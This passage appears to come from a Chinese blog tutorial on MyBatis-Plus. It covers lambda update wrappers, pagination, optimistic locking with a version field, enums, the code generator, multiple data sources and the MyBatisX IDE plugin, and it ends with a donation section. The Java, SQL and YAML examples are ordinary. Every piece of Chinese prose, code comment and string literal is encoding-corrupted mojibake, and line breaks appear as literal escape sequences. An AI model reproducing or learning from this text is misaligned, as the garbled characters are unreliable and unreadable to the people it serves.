username)\n        .ge(ageBegin != null, User::getAge, ageBegin)\n        .le(ageEnd != null, User::getAge, ageEnd);\n    List<User> list = userMapper.selectList(queryWrapper);\n    list.forEach(System.out::println);\n}\n```\n\n###  6.LambdaUpdateWrapper\n\n> åŠŸèƒ½ç­‰åŒäºUpdateWrapperï¼Œæä¾›äº†Lambdaè¡¨è¾¾å¼çš„è¯­æ³•å¯ä»¥é¿å…å¡«é”™åˆ—åã€‚\n\n```java\npublic void test12(){\n    //å°†ç”¨æˆ·åä¸­åŒ…å«æœ‰aå¹¶ä¸”ï¼ˆå¹´é¾„å¤§äº20æˆ–é‚®ç®±ä¸ºnullï¼‰çš„ç”¨æˆ·ä¿¡æ¯ä¿®æ”¹\n    LambdaUpdateWrapper<User> updateWrapper = new LambdaUpdateWrapper<>();\n    updateWrapper.like(User::getName, \"a\")\n        .and(i -> i.gt(User::getAge, 20).or().isNull(User::getEmail));\n    updateWrapper.set(User::getName, \"å°é»‘\").set(User::getEmail,\"abc@atguigu.com\");\n    int result = userMapper.update(null, updateWrapper);\n    System.out.println(\"resultï¼š\"+result);\n}\n```\n\n## äº”ã€å¸¸ç”¨æ’ä»¶\n\n### 1.åˆ†é¡µæ’ä»¶\n\n> MyBatis-Plusè‡ªå¸¦åˆ†é¡µæ’ä»¶ï¼Œåªè¦ç®€å•çš„é…ç½®å³å¯å®ç°åˆ†é¡µåŠŸèƒ½\n\n**æ·»åŠ é…ç½®ç±»`config/MyBatisPlusConfig`**\n\n```java\n@Configuration\n@MapperScan(\"com.jianjian.mpdemo.mapper\")\npublic class MyBatisPlusConfig {\n    @Bean\n    public MybatisPlusInterceptor mybatisPlusInterceptor(){\n        MybatisPlusInterceptor interceptor = new MybatisPlusInterceptor();\n        //æ·»åŠ åˆ†é¡µæ’ä»¶\n        interceptor.addInnerInterceptor(new PaginationInnerInterceptor(DbType.MYSQL));\n        return interceptor;\n    }\n}\n```\n\n**ç¼–å†™æµ‹è¯•æ–¹æ³•**\n\n```java\n@Test\npublic void testPage(){\n  //new Page()ä¸­çš„ä¸¤ä¸ªå‚æ•°åˆ†åˆ«æ˜¯å½“å‰é¡µç ï¼Œæ¯é¡µæ˜¾ç¤ºæ•°é‡\n  Page<User> page = userMapper.selectPage(new Page<>(1, 2), null);\n  List<User> users = page.getRecords();\n  users.forEach(System.out::println);\n  System.out.println(\"å½“å‰é¡µï¼š\"+page.getCurrent());\n  System.out.println(\"æ¯é¡µæ˜¾ç¤ºçš„æ¡æ•°ï¼š\"+page.getSize());\n  System.out.println(\"æ€»è®°å½•æ•°ï¼š\"+page.getTotal());\n  System.out.println(\"æ€»é¡µæ•°ï¼š\"+page.getPages());\n  System.out.println(\"æ˜¯å¦æœ‰ä¸Šä¸€é¡µï¼š\"+page.hasPrevious());\n  System.out.println(\"æ˜¯å¦æœ‰ä¸‹ä¸€é¡µï¼š\"+page.hasNext());\n}\n```\n\n### 2.è‡ªå®šä¹‰åˆ†é¡µ\n\n> ä¸Šé¢è°ƒç”¨çš„æ˜¯MyBatis-Plusæä¾›çš„å¸¦æœ‰åˆ†é¡µçš„æ–¹æ³•ï¼Œé‚£ä¹ˆæˆ‘ä»¬è‡ªå·±å®šä¹‰çš„æ–¹æ³•å¦‚ä½•å®ç°åˆ†é¡µå‘¢ï¼Ÿ\n\n**åœ¨`UserMapper`æ¥å£ä¸­å®šä¹‰ä¸€ä¸ªæ–¹æ³•**\n\n```java\n/**\n  * æ ¹æ®å¹´é¾„æŸ¥è¯¢ç”¨æˆ·åˆ—è¡¨ï¼Œåˆ†é¡µæ˜¾ç¤º \n  * @param page åˆ†é¡µå¯¹è±¡,xmlä¸­å¯ä»¥ä»é‡Œé¢è¿›è¡Œå–å€¼,ä¼ é€’å‚æ•° Page å³è‡ªåŠ¨åˆ†é¡µ,å¿…é¡»æ”¾åœ¨ç¬¬ä¸€ä½ \n  * @param age å¹´é¾„ \n  * @return \n  */\nPage<User> selectPageVo(@Param(\"page\") Page<User> page,@Param(\"age\") Integer age);\n```\n\n**åœ¨`UserMapper.xml`ä¸­ç¼–å†™SQLå®ç°è¯¥æ–¹æ³•**\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n<!DOCTYPE mapper\n        PUBLIC \"-//mybatis.org//DTD Mapper 3.0//EN\"\n        \"http://mybatis.org/dtd/mybatis-3-mapper.dtd\">\n<mapper namespace=\"com.jianjian.mpdemo.mapper.UserMapper\">\n    <select id=\"selectPageVo\" resultType=\"User\">\n        select id,name as name,age,email from t_user where age > #{age}\n    </select>\n</mapper>\n```\n\n**é…ç½® resultType åˆ«å**\n\n```yaml\nmybatis-plus:\n\t#é…ç½®ç±»å‹åˆ«åæ‰€å¯¹åº”çš„åŒ…\n  type-aliases-package: com.jianjian.mpdemo.bean\n```\n\n**ç¼–å†™æµ‹è¯•æ–¹æ³•**\n\n```java\n@Test\npublic void testPageVo(){\n    Page<User> page = userMapper.selectPageVo(new Page<User>(1,2), 20);\n    List<User> users = page.getRecords();\n    users.forEach(System.out::println);\n}\n```\n\n### 3.ä¹è§‚é”\n\n> **ä½œç”¨ï¼šå½“è¦æ›´æ–°ä¸€æ¡è®°å½•çš„æ—¶å€™ï¼Œå¸Œæœ›è¿™æ¡è®°å½•æ²¡æœ‰è¢«åˆ«äººæ›´æ–°**\n\nä¹è§‚é”çš„å®ç°æ–¹å¼ï¼š\n\n- å–å‡ºè®°å½•æ—¶ï¼Œè·å–å½“å‰ version\n- æ›´æ–°æ—¶ï¼Œå¸¦ä¸Šè¿™ä¸ª version\n- æ‰§è¡Œæ›´æ–°æ—¶ï¼Œ set version = newVersion where version = oldVersion\n- å¦‚æœ version ä¸å¯¹ï¼Œå°±æ›´æ–°å¤±è´¥\n\n#### 3.1\tåœºæ™¯\n\n---\n\n- ä¸€ä»¶å•†å“ï¼Œæˆæœ¬ä»·æ˜¯80å…ƒï¼Œå”®ä»·æ˜¯100å…ƒã€‚è€æ¿å…ˆæ˜¯é€šçŸ¥å°æï¼Œè¯´ä½ å»æŠŠå•†å“ä»·æ ¼å¢åŠ 50å…ƒã€‚å°ææ­£åœ¨ç©æ¸¸æˆï¼Œè€½æäº†ä¸€ä¸ªå°æ—¶ã€‚æ­£å¥½ä¸€ä¸ªå°æ—¶åï¼Œè€æ¿è§‰å¾—å•†å“ä»·æ ¼å¢åŠ åˆ°150å…ƒï¼Œä»·æ ¼å¤ªé«˜ï¼Œå¯èƒ½ä¼šå½±å“é”€é‡ã€‚åˆé€šçŸ¥å°ç‹ï¼Œä½ æŠŠå•†å“ä»·æ ¼é™ä½30å…ƒã€‚\n- æ­¤æ—¶ï¼Œå°æå’Œå°ç‹åŒæ—¶æ“ä½œå•†å“åå°ç³»ç»Ÿã€‚å°ææ“ä½œçš„æ—¶å€™ï¼Œç³»ç»Ÿå…ˆå–å‡ºå•†å“ä»·æ ¼100å…ƒï¼›å°ç‹ä¹Ÿåœ¨æ“ä½œï¼Œå–å‡ºçš„å•†å“ä»·æ ¼ä¹Ÿæ˜¯100å…ƒã€‚å°æå°†ä»·æ ¼åŠ äº†50å…ƒï¼Œå¹¶å°†100+50=150å…ƒå­˜å…¥äº†æ•°æ®åº“ï¼›å°ç‹å°†å•†å“å‡äº†30å…ƒï¼Œå¹¶å°†100-30=70å…ƒå­˜å…¥äº†æ•°æ®åº“ã€‚æ˜¯çš„ï¼Œå¦‚æœæ²¡æœ‰é”ï¼Œå°æçš„æ“ä½œå°±å®Œå…¨è¢«å°ç‹çš„è¦†ç›–äº†ã€‚\n- ç°åœ¨å•†å“ä»·æ ¼æ˜¯70å…ƒï¼Œæ¯”æˆæœ¬ä»·ä½10å…ƒã€‚å‡ åˆ†é’Ÿåï¼Œè¿™ä¸ªå•†å“å¾ˆå¿«å‡ºå”®äº†1åƒå¤šä»¶å•†å“ï¼Œè€æ¿äº1ä¸‡å¤šã€‚\n\n#### 3.2\tä¹è§‚é”ä¸æ‚²è§‚é”\n\n---\n\n- ä¸Šé¢çš„æ•…äº‹ï¼Œå¦‚æœæ˜¯ä¹è§‚é”ï¼Œå°ç‹ä¿å­˜ä»·æ ¼å‰ï¼Œä¼šæ£€æŸ¥ä¸‹ä»·æ ¼æ˜¯å¦è¢«äººä¿®æ”¹è¿‡äº†ã€‚å¦‚æœè¢«ä¿®æ”¹è¿‡äº†ï¼Œåˆ™é‡æ–°å–å‡ºçš„è¢«ä¿®æ”¹åçš„ä»·æ ¼ï¼Œ150å…ƒï¼Œè¿™æ ·ä»–ä¼šå°†120å…ƒå­˜å…¥æ•°æ®åº“ã€‚\n- å¦‚æœæ˜¯æ‚²è§‚é”ï¼Œå°æå–å‡ºæ•°æ®åï¼Œå°ç‹åªèƒ½ç­‰å°ææ“ä½œå®Œä¹‹åï¼Œæ‰èƒ½å¯¹ä»·æ ¼è¿›è¡Œæ“ä½œï¼Œä¹Ÿä¼šä¿è¯æœ€ç»ˆçš„ä»·æ ¼æ˜¯120å…ƒã€‚\n\n#### 3.3\tæ¨¡æ‹Ÿä¿®æ”¹å†²çª\n\n---\n\n**æ•°æ®åº“ä¸­å¢åŠ å•†å“è¡¨**\n\n```sql\nCREATE TABLE t_product ( \n    id BIGINT(20) NOT NULL COMMENT 'ä¸»é”®ID', \n    NAME VARCHAR(30) NULL DEFAULT NULL COMMENT 'å•†å“åç§°', \n    price INT(11) DEFAULT 0 COMMENT 'ä»·æ ¼', \n    VERSION INT(11) DEFAULT 0 COMMENT 'ä¹è§‚é”ç‰ˆæœ¬å·', \n    PRIMARY KEY (id) \n);\n```\n\n**æ·»åŠ ä¸€æ¡æ•°æ®**\n\n```sql\nINSERT INTO t_product (id, NAME, price) VALUES (1, 'å¤–æ˜Ÿäººç¬”è®°æœ¬', 100);\n```\n\n**æ·»åŠ ä¸€ä¸ªå®ä½“ç±»`Product`**\n\n```java\n@Data\npublic class Product {\n    private Long id;\n    private String name;\n    private Integer price;\n    private Integer version;\n}\n```\n\n**æ·»åŠ ä¸€ä¸ªMapperæ¥å£`ProductMapper`**\n\n```java\npublic interface ProductMapper extends BaseMapper<Product> {}\n```\n\n**æµ‹è¯•æ–¹æ³•**\n\n```java\n@Test\npublic void testProduct01(){\n    //1.å°æè·å–å•†å“ä»·æ ¼\n    Product productLi = productMapper.selectById(1);\n    System.out.println(\"å°æè·å–çš„å•†å“ä»·æ ¼ä¸ºï¼š\" + productLi.getPrice());\n\n    //2.å°ç‹è·å–å•†å“ä»·æ ¼\n    Product productWang = productMapper.selectById(1);\n    System.out.println(\"å°æè·å–çš„å•†å“ä»·æ ¼ä¸ºï¼š\" + productWang.getPrice());\n\n    //3.å°æä¿®æ”¹å•†å“ä»·æ ¼+50\n    productLi.setPrice(productLi.getPrice()+50);\n    productMapper.updateById(productLi);\n\n    //4.å°ç‹ä¿®æ”¹å•†å“ä»·æ ¼-30\n    productWang.setPrice(productWang.getPrice()-30);\n    productMapper.updateById(productWang);\n\n    //5.è€æ¿æŸ¥è¯¢å•†å“ä»·æ ¼\n    Product productBoss = productMapper.selectById(1);\n    System.out.println(\"è€æ¿è·å–çš„å•†å“ä»·æ ¼ä¸ºï¼š\" + productBoss.getPrice());\n}\n```\n\n**æ‰§è¡Œç»“æœ**\n\n![](https://img.jwt1399.top/img/202207041210392.png)\n\n#### 3.4\tä¹è§‚é”è§£å†³é—®é¢˜\n\n---\n\n**å®ä½“ç±»`version`å­—æ®µæ·»åŠ æ³¨è§£`@Version`**\n\n```java\n@Data\npublic class Product {\n    private Long id;\n    private String name;\n    private Integer price;\n    @Version\n    private Integer version;\n}\n```\n\n**æ·»åŠ ä¹è§‚é”æ’ä»¶é…ç½®**\n\n```java\n@Bean\npublic MybatisPlusInterceptor mybatisPlusInterceptor(){\n    MybatisPlusInterceptor interceptor = new MybatisPlusInterceptor();\n    //æ·»åŠ åˆ†é¡µæ’ä»¶\n    interceptor.addInnerInterceptor(new PaginationInnerInterceptor(DbType.MYSQL));\n    //æ·»åŠ ä¹è§‚é”æ’ä»¶\n    interceptor.addInnerInterceptor(new OptimisticLockerInnerInterceptor());\n    return interceptor;\n}\n```\n\n- **å†æ¬¡æ‰§è¡Œæµ‹è¯•æ–¹æ³•**\n\n  > å°ææŸ¥è¯¢å•†å“ä¿¡æ¯ï¼š\n  >\n  > â€‹\tSELECT id,name,price,version FROM t_product WHERE id=?\n  >\n  > å°ç‹æŸ¥è¯¢å•†å“ä¿¡æ¯ï¼š\n  >\n  > â€‹\tSELECT id,name,price,version FROM t_product WHERE id=?\n  >\n  > å°æä¿®æ”¹å•†å“ä»·æ ¼ï¼Œè‡ªåŠ¨å°†version+1\n  >\n  > â€‹\tUPDATE t_product SET name=?, price=?, version=? WHERE id=? AND version=?\n  >\n  > â€‹\tParameters: å¤–æ˜Ÿäººç¬”è®°æœ¬(String), 150(Integer), 1(Integer), 1(Long), 0(Integer)\n  >\n  > å°ç‹ä¿®æ”¹å•†å“ä»·æ ¼ï¼Œæ­¤æ—¶versionå·²æ›´æ–°ï¼Œæ¡ä»¶ä¸æˆç«‹ï¼Œä¿®æ”¹å¤±è´¥\n  >\n  > â€‹\tUPDATE t_product SET name=?, price=?, version=? WHERE id=? AND version=?\n  >\n  > â€‹\tParameters: å¤–æ˜Ÿäººç¬”è®°æœ¬(String), 70(Integer), 1(Integer), 1(Long), 0(Integer)\n  >\n  > æœ€ç»ˆï¼Œå°ç‹ä¿®æ”¹å¤±è´¥ï¼ŒæŸ¥è¯¢ä»·æ ¼ï¼š150\n  >\n  > â€‹\tSELECT id,name,price,version FROM t_product WHERE id=?\n\n\n**ä¼˜åŒ–æ‰§è¡Œæµç¨‹**\n\n```java\n@Test\npublic void testProduct01(){\n    //1.å°æè·å–å•†å“ä»·æ ¼\n    Product productLi = productMapper.selectById(1);\n    System.out.println(\"å°æè·å–çš„å•†å“ä»·æ ¼ä¸ºï¼š\" + productLi.getPrice());\n\n    //2.å°ç‹è·å–å•†å“ä»·æ ¼\n    Product productWang = productMapper.selectById(1);\n    System.out.println(\"å°æè·å–çš„å•†å“ä»·æ ¼ä¸ºï¼š\" + productWang.getPrice());\n\n    //3.å°æä¿®æ”¹å•†å“ä»·æ ¼+50\n    productLi.setPrice(productLi.getPrice()+50);\n    productMapper.updateById(productLi);\n\n    //4.å°ç‹ä¿®æ”¹å•†å“ä»·æ ¼-30\n    productWang.setPrice(productWang.getPrice()-30);\n    int result = productMapper.updateById(productWang);\n    if(result == 0){\n        //æ“ä½œå¤±è´¥ï¼Œé‡è¯•\n        Product productNew = productMapper.selectById(1);\n        productNew.setPrice(productNew.getPrice()-30);\n        productMapper.updateById(productNew);\n    }\n\n    //5.è€æ¿æŸ¥è¯¢å•†å“ä»·æ ¼\n    Product productBoss = productMapper.selectById(1);\n    System.out.println(\"è€æ¿è·å–çš„å•†å“ä»·æ ¼ä¸ºï¼š\" + productBoss.getPrice());\n}\n```\n\n![](https://img.jwt1399.top/img/202207041215445.png)\n\n## å…­ã€é€šç”¨æšä¸¾\n\n> è¡¨ä¸­çš„æœ‰äº›å­—æ®µå€¼æ˜¯å›ºå®šçš„ï¼Œä¾‹å¦‚æ€§åˆ«ï¼ˆç”·æˆ–å¥³ï¼‰ï¼Œæ­¤æ—¶æˆ‘ä»¬å¯ä»¥ä½¿ç”¨MyBatis-Plusçš„é€šç”¨æšä¸¾æ¥å®ç°\n\n**æ•°æ®åº“è¡¨æ·»åŠ å­—æ®µ`sex`**\n\n![](https://img.jwt1399.top/img/202207041216570.png)\n\n**åˆ›å»ºé€šç”¨æšä¸¾ç±»å‹**\n\n```java\n@Getter\npublic enum SexEnum {\n    MALE(1, \"ç”·\"),\n    FEMALE(2, \"å¥³\");\n\n    @EnumValue //å°†æ³¨è§£æ‰€æ ‡è¯†çš„å±æ€§çš„å€¼å­˜å‚¨åˆ°æ•°æ®åº“ä¸­\n    private int sex;\n    private String sexName;\n\n    SexEnum(Integer sex, String sexName) {\n        this.sex = sex;\n        this.sexName = sexName;\n    }\n}\n```\n\n**Userå®ä½“ç±»ä¸­æ·»åŠ å±æ€§sex**\n\n```java\npublic class User {\n    private Long id;\n    @TableField(\"username\")\n    private String name;\n    private Integer age;\n    private String email;\n    @TableLogic\n    private int isDeleted;  //é€»è¾‘åˆ é™¤\n\n    private SexEnum sex;\n}\n```\n\n**é…ç½®æ‰«æé€šç”¨æšä¸¾**\n\n```yml\nmybatis-plus:\n  # æ‰«æé€šç”¨æšä¸¾çš„åŒ…\n  type-enums-package: com.jianjian.mpdemo.enums\n```\n\n**æ‰§è¡Œæµ‹è¯•æ–¹æ³•**\n\n```java\n@Test\npublic void test(){\n    User user = new User();\n    user.setName(\"admin\");\n    user.setAge(33);\n    user.setSex(SexEnum.MALE);\n    int result = userMapper.insert(user);\n    System.out.println(\"result:\"+result);\n}\n```\n\n## ä¸ƒã€ä»£ç ç”Ÿæˆå™¨\n\n### 1ã€å¼•å…¥ä¾èµ–\n\n```xml\n<dependency>\n  <groupId>com.baomidou</groupId>\n  <artifactId>mybatis-plus-generator</artifactId>\n  <version>3.5.1</version>\n</dependency>\n<dependency>\n  <groupId>org.freemarker</groupId>\n  <artifactId>freemarker</artifactId>\n  <version>2.3.31</version>\n</dependency>\n```\n\n### 2ã€å¿«é€Ÿç”Ÿæˆ\n\n```java\npublic class FastAutoGeneratorTest {\n    public static void main(String[] args) {\n        FastAutoGenerator.create(\"jdbc:mysql://127.0.0.1:3306/mybatis_plus? characterEncoding=utf-8&userSSL=false\", \"root\", \"root\")\n                .globalConfig(builder -> {\n                    builder.author(\"jianjian\") // è®¾ç½®ä½œè€…\n                            //.enableSwagger() // å¼€å¯ swagger æ¨¡å¼\n                            .fileOverride() // è¦†ç›–å·²ç”Ÿæˆæ–‡ä»¶\n                            .outputDir(\"/Users/jianjian/Downloads\"); // æŒ‡å®šè¾“å‡ºç›®å½•\n                })\n                .packageConfig(builder -> {\n                    builder.parent(\"com.jianjian\") // è®¾ç½®çˆ¶åŒ…å\n                            .moduleName(\"mybatisplus\") // è®¾ç½®çˆ¶åŒ…æ¨¡å—å\n                            .pathInfo(Collections.singletonMap(OutputFile.mapperXml, \"/Users/jianjian/Downloads\"));// è®¾ç½®mapperXmlç”Ÿæˆè·¯å¾„\n                })\n                .strategyConfig(builder -> {\n                    builder.addInclude(\"t_user\") // è®¾ç½®éœ€è¦ç”Ÿæˆçš„è¡¨å\n                            .addTablePrefix(\"t_\", \"c_\"); // è®¾ç½®è¿‡æ»¤è¡¨å‰ç¼€\n                })\n                .templateEngine(new FreemarkerTemplateEngine()) // ä½¿ç”¨Freemarkerå¼•æ“æ¨¡æ¿ï¼Œé»˜è®¤çš„æ˜¯Velocityå¼•æ“æ¨¡æ¿\n                .execute();\n    }\n}\n```\n\n## å…«ã€å¤šæ•°æ®æº\n\n> é€‚ç”¨äºå¤šç§åœºæ™¯ï¼šçº¯ç²¹å¤šåº“ã€ è¯»å†™åˆ†ç¦»ã€ ä¸€ä¸»å¤šä»ã€ æ··åˆæ¨¡å¼ç­‰\n\nåœºæ™¯è¯´æ˜ï¼šæˆ‘ä»¬åˆ›å»ºä¸¤ä¸ªåº“ï¼Œåˆ†åˆ«ä¸ºï¼š`mybatis_plus`ï¼ˆä»¥å‰çš„åº“ä¸åŠ¨ï¼‰ä¸`mybatis_plus_1`ï¼ˆæ–°å»ºï¼‰ï¼Œå°†mybatis_plusåº“æœ‰`User`è¡¨ï¼Œmybatis_plus_1åº“æœ‰`Product`è¡¨ï¼Œè¿™æ ·æ¯ä¸ªåº“ä¸€å¼ è¡¨ï¼Œé€šè¿‡ä¸€ä¸ªæµ‹è¯•ç”¨ä¾‹åˆ†åˆ«è·å–ç”¨æˆ·æ•°æ®ä¸å•†å“æ•°æ®ï¼Œå¦‚æœè·å–åˆ°è¯´æ˜å¤šåº“æ¨¡æ‹ŸæˆåŠŸ\n\n### 1.åˆ›å»ºæ•°æ®åº“åŠè¡¨\n\n**åˆ›å»ºæ•°æ®åº“`mybatis_plus_1`å’Œè¡¨`product`**\n\n```sql\nCREATE DATABASE `mybatis_plus_1` /*!40100 DEFAULT CHARACTER SET utf8mb4 */;\nuse `mybatis_plus_1`; \nCREATE TABLE product ( \n    id BIGINT(20) NOT NULL COMMENT 'ä¸»é”®ID', \n    name VARCHAR(30) NULL DEFAULT NULL COMMENT 'å•†å“åç§°', \n    price INT(11) DEFAULT 0 COMMENT 'ä»·æ ¼', \n    version INT(11) DEFAULT 0 COMMENT 'ä¹è§‚é”ç‰ˆæœ¬å·', \n    PRIMARY KEY (id) \n);\n```\n\n**æ·»åŠ æµ‹è¯•æ•°æ®**\n\n```sql\nINSERT INTO product (id, NAME, price) VALUES (1, 'å¤–æ˜Ÿäººç¬”è®°æœ¬', 100);\n```\n\n**åˆ é™¤`mybatis_plus`åº“ä¸­çš„`product`è¡¨** \n\n```sql\nuse mybatis_plus; \nDROP TABLE IF EXISTS product;\n```\n\n### 2.æ–°å»ºå·¥ç¨‹å¼•å…¥ä¾èµ–\n\n> **è‡ªè¡Œæ–°å»ºä¸€ä¸ªSpring Bootå·¥ç¨‹å¹¶é€‰æ‹©MySQLé©±åŠ¨åŠLombokä¾èµ–**\n\n**å¼•å…¥MyBaits-Plusçš„ä¾èµ–åŠå¤šæ•°æ®æºçš„ä¾èµ–**\n\n```xml\n<dependency>\n    <groupId>com.baomidou</groupId>\n    <artifactId>mybatis-plus-boot-starter</artifactId>\n    <version>3.5.1</version>\n</dependency>\n\n<dependency>\n    <groupId>com.baomidou</groupId>\n    <artifactId>dynamic-datasource-spring-boot-starter</artifactId>\n    <version>3.5.0</version>\n</dependency>\n```\n\n### 3.ç¼–å†™é…ç½®æ–‡ä»¶\n\n```yml\nspring:\n  # é…ç½®æ•°æ®æºä¿¡æ¯\n  datasource:\n    dynamic:\n      # è®¾ç½®é»˜è®¤çš„æ•°æ®æºæˆ–è€…æ•°æ®æºç»„,é»˜è®¤å€¼å³ä¸ºmaster\n      primary: master\n      # ä¸¥æ ¼åŒ¹é…æ•°æ®æº,é»˜è®¤false.falseä½¿ç”¨é»˜è®¤æ•°æ®æº,trueæœªåŒ¹é…åˆ°æŒ‡å®šæ•°æ®æºæ—¶æŠ›å¼‚å¸¸\n      strict: false\n      datasource:\n        master:\n          url: jdbc:mysql://localhost:3306/mybatis_plus?characterEncoding=utf-8&useSSL=false\n          driver-class-name: com.mysql.cj.jdbc.Driver\n          username: root\n          password: root\n        slave_1:\n          url: jdbc:mysql://localhost:3306/mybatis_plus_1?characterEncoding=utf-8&useSSL=false\n          driver-class-name: com.mysql.cj.jdbc.Driver\n          username: root\n          password: root\n```\n\n### 4.åˆ›å»ºå®ä½“ç±»\n\næ–°å»ºä¸€ä¸ª`User`å®ä½“ç±»ï¼ˆå¦‚æœæ•°æ®åº“è¡¨åæœ‰t_å‰ç¼€è®°å¾—é…ç½®ï¼‰\n\n```java\n@Data\npublic class User {\n    private Long id;\n    private String name;\n    private Integer age;\n    private String email;\n}\n```\n\næ–°å»ºä¸€ä¸ªå®ä½“ç±»`Product`\n\n```java\n@Data\npublic class Product {\n    private Long id;\n    private String name;\n    private Integer price;\n    private Integer version;\n}\n```\n\n### 5.åˆ›å»ºMapperåŠService\n\næ–°å»ºæ¥å£`UserMapper`\n\n```java\npublic interface UserMapper extends BaseMapper<User> {}\n```\n\næ–°å»ºæ¥å£`ProductMapper`\n\n```java\npublic interface ProductMapper extends BaseMapper<Product> {}\n```\n\næ–°å»ºServiceæ¥å£`UserService`æŒ‡å®šæ“ä½œçš„æ•°æ®æº\n\n```java\n@DS(\"master\") //æŒ‡å®šæ“ä½œçš„æ•°æ®æºï¼Œmasterä¸ºuserè¡¨\npublic interface UserService extends IService<User> {}\n```\n\næ–°å»ºServiceæ¥å£`ProductService`æŒ‡å®šæ“ä½œçš„æ•°æ®æº\n\n```java\n@DS(\"slave_1\")\npublic interface ProductService extends IService<Product> {}\n```\n\nå»ºç«‹Serviceçš„å®ç°ç±»\n\n```java\n@Service\n@DS(\"master\") \npublic class UserServiceImpl extends ServiceImpl<UserMapper, User> implements UserService {\n}\n```\n\n```java\n@Service\n@DS(\"slave_1\") \npublic class ProductServiceImpl extends ServiceImpl<ProductMapper, Product> implements ProductService {\n}\n```\n\n### 6.ç¼–å†™æµ‹è¯•æ–¹æ³•\n\n> **è®°å¾—åœ¨å¯åŠ¨ç±»ä¸­æ·»åŠ æ³¨è§£`@MapperScan()`**\n\n```java\nclass TestDatasourceApplicationTests {\n\t@Resource\n\tUserService userService;\n\n\t@Resource\n\tProductService productService;\n\n\t@Test\n\tvoid contextLoads() {\n\t\tUser user = userService.getById(1L);\n\t\tProduct product = productService.getById(1L);\n\t\tSystem.out.println(\"User = \" + user);\n\t\tSystem.out.println(\"Product = \" + product);\n\t}\n}\n```\n\n![](https://img.jwt1399.top/img/202207041919486.png)\n\n## ä¹ã€MyBatisXæ’ä»¶\n\n> MyBatis-Plusä¸ºæˆ‘ä»¬æä¾›äº†å¼ºå¤§çš„mapperå’Œserviceæ¨¡æ¿ï¼Œèƒ½å¤Ÿå¤§å¤§çš„æé«˜å¼€å‘æ•ˆç‡ã€‚\n>\n> ä½†æ˜¯åœ¨çœŸæ­£å¼€å‘è¿‡ç¨‹ä¸­ï¼ŒMyBatis-Pluså¹¶ä¸èƒ½ä¸ºæˆ‘ä»¬è§£å†³æ‰€æœ‰é—®é¢˜ï¼Œä¾‹å¦‚ä¸€äº›å¤æ‚çš„SQLï¼Œå¤šè¡¨è”æŸ¥ï¼Œæˆ‘ä»¬å°±éœ€è¦è‡ªå·±å»ç¼–å†™ä»£ç å’ŒSQLè¯­å¥ï¼Œæˆ‘ä»¬è¯¥å¦‚ä½•å¿«é€Ÿçš„è§£å†³è¿™ä¸ªé—®é¢˜å‘¢ï¼Œè¿™ä¸ªæ—¶å€™å¯ä»¥ä½¿ç”¨MyBatisXæ’ä»¶ã€‚\n>\n> MyBatisXä¸€æ¬¾åŸºäº IDEA çš„å¿«é€Ÿå¼€å‘æ’ä»¶ï¼Œä¸ºæ•ˆç‡è€Œç”Ÿã€‚\n\n### 1.å®‰è£…MyBatisXæ’ä»¶\n\n> **æ‰“å¼€IDEAï¼ŒFile-> Setteings->Plugins->MyBatisXï¼Œæœç´¢æ æœç´¢MyBatisXç„¶åå®‰è£…ã€‚**\n\n![](https://img.jwt1399.top/img/202207041921425.png)\n\n### 2.å¿«é€Ÿç”Ÿæˆä»£ç \n\næ–°å»ºä¸€ä¸ªSpring Booté¡¹ç›®å¼•å…¥ä¾èµ–ï¼ˆåˆ›å»ºå·¥ç¨‹æ—¶è®°å¾—å‹¾é€‰lombokåŠmysqlé©±åŠ¨ï¼‰\n\n```xml\n<dependency>\n    <groupId>com.baomidou</groupId>\n    <artifactId>mybatis-plus-boot-starter</artifactId>\n    <version>3.5.1</version>\n</dependency>\n\n<dependency>\n    <groupId>com.baomidou</groupId>\n    <artifactId>dynamic-datasource-spring-boot-starter</artifactId>\n    <version>3.5.0</version>\n</dependency>\n```\n\né…ç½®æ•°æ®æºä¿¡æ¯\n\n```yml\nspring:\n  datasource:\n    type: com.zaxxer.hikari.HikariDataSource\n    driver-class-name: com.mysql.cj.jdbc.Driver\n    url: jdbc:mysql://localhost:3306/mybatis_plus?characterEncoding=utf-8&useSSL=false\n    username: root\n    password: root\n```\n\nåœ¨IDEAä¸­ä¸æ•°æ®åº“å»ºç«‹é“¾æ¥\n\n![](https://img.jwt1399.top/img/202207041921049.png)\n\nå¡«å†™æ•°æ®åº“ä¿¡æ¯å¹¶ä¿å­˜\n\n![](https://img.jwt1399.top/img/202207041921532.png)\n\næ‰¾åˆ°æˆ‘ä»¬éœ€è¦ç”Ÿæˆçš„è¡¨ç‚¹å‡»å³é”®\n\n![](https://img.jwt1399.top/img/202207041921993.png)\n\nå¡«å†™å®Œä¿¡æ¯ä»¥åä¸‹ä¸€æ­¥\n\n![](https://img.jwt1399.top/img/202207041922081.png)\n\nç»§ç»­å¡«å†™ä¿¡æ¯\n\n![](https://img.jwt1399.top/img/202207041922619.png)\n\n**å¤§åŠŸå‘Šæˆ**\n\n![](https://img.jwt1399.top/img/202207041923724.png)\n\n\n\n### 3.å¿«é€Ÿç”ŸæˆCRUD\n\n> MyBaitsXå¯ä»¥æ ¹æ®æˆ‘ä»¬åœ¨Mapperæ¥å£ä¸­è¾“å…¥çš„æ–¹æ³•åå¿«é€Ÿå¸®æˆ‘ä»¬ç”Ÿæˆå¯¹åº”çš„sqlè¯­å¥\n\nå¿«æ·é”® Macï¼šoption+enter ã€Winï¼šAlt+enter\n\n![](https://img.jwt1399.top/img/202207041923267.png)\n\n![](https://img.jwt1399.top/img/202207041923095.png)\n\n\n\n\n\n## Sponsorâ¤ï¸\n\næ‚¨çš„æ”¯æŒæ˜¯æˆ‘ä¸æ–­å‰è¿›çš„åŠ¨åŠ›ï¼Œå¦‚æœæ‚¨æ„Ÿè§‰æœ¬æ–‡å¯¹æ‚¨æœ‰æ‰€å¸®åŠ©çš„è¯ï¼Œå¯ä»¥è€ƒè™‘æ‰“èµä¸€ä¸‹æœ¬æ–‡ï¼Œç”¨ä»¥ç»´æŒæœ¬åšå®¢çš„è¿è¥è´¹ç”¨ï¼Œæ‹’ç»ç™½å«–ï¼Œä»ä½ æˆ‘åšèµ·ï¼ğŸ¥°ğŸ¥°ğŸ¥°\n\n<table>\n  <tbody>\n     <tr>\n         <td style=\"text-align:center;\">æ”¯ä»˜å®</td>\n         <td style=\"text-align:center;\">å¾®ä¿¡</td>\n     </tr>\n   <tr>\n    <td style=\"text-align:center;\" ><img width=\"200\" src=\"https://jwt1399.top/medias/reward/alipay.png\"></td>    \n      <td style=\"text-align:center;\"><img width=\"200\" 